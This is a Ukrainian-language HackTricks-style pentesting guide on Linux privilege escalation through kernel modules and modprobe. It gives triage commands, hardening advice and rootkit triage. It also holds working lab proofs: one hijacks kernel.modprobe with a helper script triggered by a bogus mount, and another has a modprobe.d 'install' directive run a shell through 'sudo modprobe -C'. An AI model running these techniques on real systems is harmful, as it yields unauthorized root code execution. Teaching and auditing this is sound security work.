# Зловживання модулями ядра та modprobe

{{#include ../../banners/hacktricks-training.md}}

## Неправильні налаштування модулів ядра та їх завантаження

Під час перевірки Linux на можливості підвищення привілеїв підтримка модулів ядра є важливою сферою. Не вважайте кожне повідомлення про непідписаний модуль ознакою вразливості, але використовуйте його, щоб з’ясувати практичні можливості.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Чи може поточний користувач завантажувати модулі через `sudo`, capabilities або шлях до доступного для запису допоміжного файла?
- Чи ввімкнено завантаження модулів?
- Чи вимкнено перевірку підпису модулів?
- Чи доступні для запису каталоги модулів, файли модулів або шляхи конфігурації `modprobe.d`?<sup>[[16]](#references)</sup>
- Чи можна читати журнали ядра, щоб підтвердити, що сталося?

Швидке первинне оцінювання починається з наведених нижче перевірок стану модулів, підписів, журналювання та дерева модулів.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Інтерпретація:

- `modules_disabled=1` означає, що модулі не можна ні завантажувати, ні вивантажувати, а значення не можна скинути до `0` до перезавантаження.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` у командному рядку ядра або `CONFIG_MODULE_SIG_FORCE=y` вимагає модулі з дійсним цифровим підписом; інакше можуть завантажуватися непідписані модулі, які позначатимуть ядро як tainted.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` не обмежує доступ до `dmesg`; коли значення дорівнює `1`, для доступу потрібна можливість `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Записувані шляхи в `/lib/modules/$(uname -r)/` небезпечні, оскільки `modprobe` шукає в цьому дереві та даних про залежності під час завантаження модулів.<sup>[[8]](#references)</sup>

### Завантаження модуля та читання виводу ядра

Якщо у вас є законний дозвіл завантажити локальний модуль, `insmod` вставляє саме той файл `.ko`, який ви вказали. Функція init модуля виконується під час завантаження, а повідомлення, записані за допомогою `printk()`, надходять до буфера журналу ядра, який зазвичай читають командою `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Мінімальний процес перевірки використовує `modinfo` для перегляду метаданих, `insmod` і `rmmod` для завантаження та видалення модуля, `lsmod` для підтвердження його завантаженого стану, а `dmesg` — для перегляду журналів ядра.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Якщо `sudo -l` дозволяє виконувати `insmod`, `modprobe` або їхню обгортку, вважайте це критичною проблемою: `sudo -l` показує привілеї користувача, який виконує команду, а для завантаження модуля ядра потрібна `CAP_SYS_MODULE`. Див. [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module), щоб дізнатися про прямі способи використання можливостей.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod`, дозволений через sudo

Правило sudo, яке дозволяє користувачу запускати `insmod`, не можна прирівнювати до дозволу на запуск звичайного адміністративного допоміжного засобу. Код ініціалізації модуля виконується під час його завантаження, тож під час практичної перевірки слід з’ясувати, чи може цей користувач вибрати або змінити модуль, який завантажується.<sup>[[3]](#references)</sup>

Наведений нижче загальний процес перевірки повторює перевірки кандидата на модуль: його дослідження, завантаження, стану, журналу та видалення.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Якщо користувач може надати довільний файл `.ko`, під час авторизованої оцінки це слід розглядати як повну компрометацію системи. Безпечніший оперативний підхід — не делегувати завантаження модулів через sudo; якщо цього не уникнути, обмежте точний шлях, власника, дозволи, політику підписування та процедуру видалення.<sup>[[3]](#references)[[10]](#references)</sup>

Нижче наведено мінімальний вихідний код і Makefile для безпечного шаблону збирання модуля в контрольованій лабораторії; форма `make -C /lib/modules/$(uname -r)/build M=$PWD` відповідає задокументованому в ядрі робочому процесу kbuild для зовнішніх модулів.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Збирайте й завантажуйте лише в авторизованій лабораторії; kbuild збирає зовнішній модуль, а команди завантаження/видалення викликають інтерфейси модулів ядра.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Перевірки на зловживання `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` задає допоміжну програму userspace, яку ядро запускає для запитів на автоматичне завантаження модулів; цей sysctl впливає на автоматичне завантаження, а не на явне додавання модулів. Якщо зловмисник може змінити його на шлях до виконуваного файла, доступного для запису, і ініціювати запит на завантаження модуля, ця допоміжна програма стає шляхом до виконання коду з привілеями. Порожнє значення вимикає запити на автоматичне завантаження; якщо `CONFIG_STATIC_USERMODEHELPER=y`, будь-яке непорожнє значення замінюється на шлях до статичної допоміжної програми, вбудований під час компіляції.<sup>[[1]](#references)</sup>

Перевірте поточний шлях до допоміжної програми через інтерфейс sysctl ядра та перегляньте власника й режим доступу цільового файла.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Перевірте, чи можна вплинути на sysctl, делеговані правила sudo або файлові capabilities.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Наведений нижче шаблон призначений лише для лабораторного використання: він змінює шлях до допоміжної програми та спричиняє задокументований запит на автозавантаження модуля; використовуйте його лише в ізольованій системі, на використання якої маєте дозвіл.<sup>[[1]](#references)</sup>

У сучасних ядрах Linux не використовуйте невідомий виконуваний файл як універсальний тригер: застаріле автозавантаження модулів для користувацьких форматів двійкових файлів вилучили в Linux 6.14, тоді як документація ядра вказує на невідомий тип файлової системи як на шлях для запиту на автозавантаження модуля.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

У hardened-системах це має завершитися невдачею, якщо дозволи забороняють непривілейований запис до `kernel.modprobe`, шлях до helper-файлу недоступний для запису або автозавантаження модулів вимкнено.<sup>[[1]](#references)</sup>

### Доступна для запису конфігурація `modprobe.d` і `sudo modprobe -C`

Перш ніж визначити модуль, `modprobe` читає файли `.conf` із каталогів конфігурації, таких як `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` і `/lib/modprobe.d`, у порядку пріоритету. Файл з однаковою назвою у каталозі з вищим пріоритетом перекриває файл із каталогу з нижчим пріоритетом. Що важливіше, директива `install <module> <command>` запускає довільну shell-команду **замість** вставлення цього модуля. Тому доступний для запису шлях конфігурації може призвести до відкладеного виконання команд із правами пізнішого привілейованого користувача `modprobe`; примусове застосування підписів модулів ядра не автентифікує цю команду userspace.<sup>[[16]](#references)</sup>

Перевірте дозволи каталогів і файлів, а потім перегляньте ефективну конфігурацію. `modprobe -n -v` безпечно використовувати для перевірки визначення модуля, оскільки режим пробного запуску не вставляє модуль і не виконує команду `install`/`remove`. Надавайте перевагу `modprobe -c` замість застарілого варіанта `--showconfig`, який, згідно з актуальною документацією kmod, планують вилучити після kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Необмежене правило sudo для `modprobe` можна використати, навіть якщо довільні файли `.ko` не проходять перевірку підпису: параметр `-C` вказує на контрольований зловмисником каталог конфігурації, з якого процес, запущений через sudo, може виконати команду `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Для пом’якшення ризику не надавайте через sudo доступ до `modprobe` без обмежень на аргументи, зберігайте всі каталоги конфігурації у власності root і забороніть запис до них, а також перевіряйте неочікувані директиви `install`/`remove`. Якщо довірений адміністративний процес має обійти такі директиви для одного модуля, `modprobe --ignore-install` ігнорує їх для цього модуля, але для залежностей усе ще можуть виконуватися власні команди.<sup>[[8]](#references)[[16]](#references)</sup>

### Перевірка доступу на запис до `/lib/modules`

Доступні для запису каталоги модулів можуть дозволити підміну модулів, розміщення шкідливих модулів або зловживання автозавантаженням — залежно від того, як надалі викликається `modprobe`; під час пошуку модулів `modprobe` перевіряє `/lib/modules/$(uname -r)` і використовує дані про залежності.<sup>[[8]](#references)</sup>

Перевірте файли модулів і метадані залежностей/псевдонімів, доступні для запису, у дереві модулів активного випуску ядра.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Якщо знайдете вміст модуля, доступний для запису, перевірте, як modprobe визначає залежності та як modinfo відображає метадані модуля.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Захисні примітки:

- Зберігайте `/lib/modules` у власності `root:root` і забороніть користувачам записувати до цього каталогу.<sup>[[8]](#references)</sup>
- Установлюйте `kernel.modules_disabled=1` після завантаження системи, якщо це можливо з операційного погляду.<sup>[[1]](#references)</sup>
- Увімкніть перевірку підпису модулів у системах, яким потрібні завантажувані модулі.<sup>[[2]](#references)</sup>
- Відстежуйте зміни в `/proc/sys/kernel/modprobe`, `/lib/modules` і каталогах конфігурації `modprobe.d`, а також неочікуваний запуск `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Первинний аналіз rootkit на основі модулів

Шкідливий модуль може перехоплювати системні виклики, подання VFS або `/proc`, мережеві шляхи чи перевірки облікових даних, щоб приховувати процеси та файли, перенаправляти трафік або перехоплювати секрети. Він також може вилучити себе зі списку модулів, який показує `lsmod`. Механізм закріплення може використовувати псевдоніми або правила встановлення в `modprobe.d`, `/etc/modules-load.d`, модуль systemd, вміст initramfs або підміну легітимного файлу `.ko`. Звичайний результат `lsmod` є корисним свідченням, але компрометація на рівні ядра може зробити списки, надані ядром, ненадійними. Зіставляйте завантажені модулі, файли на диску, конфігурацію завантаження, журнали завантаження модулів і довірені зовнішні дані телеметрії.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Перевіряйте неочікувані назви модулів, шляхи, залежності, підписи та час завантаження. Повідомлення про taint ядра й непідписані модулі — це підказки, а не доказ наявності rootkit. Якщо є підозра на rootkit, зберіть докази з довіреного образу або середовища відновлення, перш ніж покладатися на дані активного ядра. На сторінці [оцінювання вразливостей ядра](kernel-vulnerability-assessment.md) розглянуто конфігурацію та діагностичну експозицію, зокрема tracefs і закріплені об’єкти BPF.

## References

- [1] [Документація для /proc/sys/kernel/ — Документація ядра Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Механізм підписування модулів ядра — Документація ядра Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Основи драйверів — Документація ядра Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Ведення журналу повідомлень за допомогою printk — Документація ядра Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Збирання зовнішніх модулів — Документація ядра Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — сторінка посібника Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Злиття тегу 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
